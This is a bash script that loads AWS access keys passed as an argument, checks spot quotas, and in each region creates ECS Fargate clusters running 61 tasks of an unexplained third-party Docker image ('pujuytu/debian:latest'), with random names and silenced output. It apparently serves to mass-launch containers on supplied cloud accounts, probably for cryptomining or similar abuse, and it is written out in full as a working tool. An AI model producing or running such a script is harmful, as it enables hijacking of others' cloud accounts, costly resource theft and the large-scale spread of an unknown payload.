#!/bin/bash
##apt-get update -y
##apt install python3-pip curl jq -y
##pip3 install awscli

Regions=()


Regions+=("us-east-1")
Regions+=("us-east-1")
#Regions+=("us-west-2")
#Regions+=("ap-southeast-1")
#Regions+=("eu-west-2")

#Regions+=("ap-northeast-1")

#Regions+=("us-east-2")

#Regions+=("ap-northeast-2")
###Regions+=("ap-east-1")






#Regions+=("us-west-1")

#Regions+=("eu-west-3")
#Regions+=("eu-north-1")





#Regions+=("ap-south-1")
#Regions+=("eu-central-1")


#Regions+=("ap-northeast-3")

#Regions+=("ap-southeast-2")

#Regions+=("ca-central-1")
#Regions+=("eu-west-1")
#Regions+=("sa-east-1")






RandString() {
  s=""
  n="${1:-5}"
  for((i=0;i<n;i++)); do
    s=${s}$(echo "$[`od -An -N2 -i /dev/urandom` % 26 + 97]" |awk '{printf("%c", $1)}')
  done
  echo "$s"
}

init()
{
dpkg -P awscli >> /dev/null 2>&1
rm -rf ~/aws >> /dev/null 2>&1
if which aws >> /dev/null 2>&1
then
	NAME=$RANDOM
	ID="$(echo $API |awk -F , '{print $1}')"
	SECRET="$(echo $API |awk -F , '{print $2}')"
	TAG="$(echo $API |awk -F , '{print $3}')"
	QUOTA="$(echo $API |awk -F , '{print $4}')"
	RandStr="dev"
	RandStr4=`RandString 4`
	RandStr5=`RandString 5`
	RandStr6="dev2"
	RandStr7=`RandString 4`
	RandNum="$((`od -An -N2 -i /dev/urandom` % 10 + 1024))"
	IMAGE="pujuytu/debian:latest"
	OVHNAME="${TAG}${RandStr}"
	mkdir -p ~/aws >> /dev/null 2>&1
  mkdir -p ~/.aws >> /dev/null 2>&1
cat <<EOF > ~/.aws/config
[default]
output = json
region = us-east-2
EOF
cat <<EOF > ~/.aws/credentials
[default]
aws_access_key_id = $ID
aws_secret_access_key = $SECRET
EOF
else
  # sudo su root
  apt update -y
	apt install -qqy python3-pip curl jq
	pip3 install awscli
	init
	# exit 1
fi
}

CreateINS()
{
	for REG in $(cat /tmp/quotas.tmp);
	do
		Docker $REG
	done
}

Region()
{
sed -i "/region/d" ~/.aws/config
echo "region = $1" >> ~/.aws/config
}

Docker()
{
	R=$(echo $1 |awk -F , '{print $1}')
	Region $R
	echo "{\"family\":\"$RandStr\",\"networkMode\":\"awsvpc\",\"cpu\":\"1024\",\"memory\":\"4096\",\"requiresCompatibilities\":[\"EC2\",\"FARGATE\"],\"containerDefinitions\":[{\"name\":\"$RandStr\",\"image\":\"$IMAGE\",\"cpu\":1024,\"memoryReservation\":4000,\"essential\":true}]}" > ~/docker.json
	aws ecs create-cluster \
        --cluster-name $RandStr
	aws ecs register-task-definition --cli-input-json file://~/docker.json
	VID=$(aws ec2  describe-vpcs | jq .Vpcs[].VpcId |head -n1 |xargs)
	GID=$(aws ec2 describe-security-groups --filters Name=group-name,Values=default Name=vpc-id,Values=$VID | jq .SecurityGroups[].GroupId |xargs)
	SID=$(aws ec2 describe-subnets --filters "Name=vpc-id,Values=$VID" |jq .Subnets[].SubnetId |head -1 |xargs )
	##aws ec2 authorize-security-group-ingress --group-id $GID --protocol all --cidr 0.0.0.0/0 >> /dev/null 2>&1
	aws ecs create-service --cli-input-json "{\"capacityProviderStrategy\":[{\"base\":0,\"capacityProvider\":\"FARGATE\",\"weight\":1}],\"cluster\":\"$RandStr\",\"serviceName\": \"$RandStr\",\"deploymentConfiguration\":{\"maximumPercent\":200,\"minimumHealthyPercent\":100},\"desiredCount\":61,\"networkConfiguration\":{\"awsvpcConfiguration\":{\"assignPublicIp\":\"ENABLED\",\"securityGroups\":[\"$GID\"],\"subnets\":[\"$SID\"]}},\"taskDefinition\":\"$RandStr\"}"
	##sleep 3s
	#aws ecs create-service --cli-input-json "{\"capacityProviderStrategy\":[{\"base\":0,\"capacityProvider\":\"FARGATE_SPOT\",\"weight\":1}],\"cluster\":\"$RandStr\",\"serviceName\": \"$RandStr6\",\"deploymentConfiguration\":{\"maximumPercent\":200,\"minimumHealthyPercent\":100},\"desiredCount\":61,\"networkConfiguration\":{\"awsvpcConfiguration\":{\"assignPublicIp\":\"ENABLED\",\"securityGroups\":[\"$GID\"],\"subnets\":[\"$SID\"]}},\"taskDefinition\":\"$RandStr\"}"
	aws ec2 describe-network-interfaces | jq .NetworkInterfaces[].PrivateIpAddresses[].Association.PublicIp | sed 's/"//g' > ~/aws/$R
	if [ "$(cat ~/aws/$R |wc -l)" -lt "0" ];then
		#sleep 3s
		Docker $1
	fi
}

CheckV()
{
	rm -rf /tmp/quotas.tmp
	for R in "${Regions[@]}";
	do
		QUO=""
		QUO=$(aws service-quotas --output text --region $R list-service-quotas --service-code ec2 --query "Quotas[*].{QuotaName:QuotaName,Value:Value}" | grep "All Standard (A, C, D, H, I, M, R, T, Z) Spot Instance Requests" | awk -F Requests '{print $2}' | xargs)
		if [ "$QUO" = "5.0" ];then
			echo $R,8 >> /tmp/quotas.tmp
		elif [ "$QUO" = "8.0" ];then
			echo $R,8 >> /tmp/quotas.tmp	
		elif [ "$QUO" = "1.0" ];then
			echo $R,32 >> /tmp/quotas.tmp
		elif [ "$QUO" != "1.0" ];then
			echo $R,32 >> /tmp/quotas.tmp
		fi
	done
	}

Main()
{
	init
	CheckV
	CreateINS
}

API="$1"
Main
wait

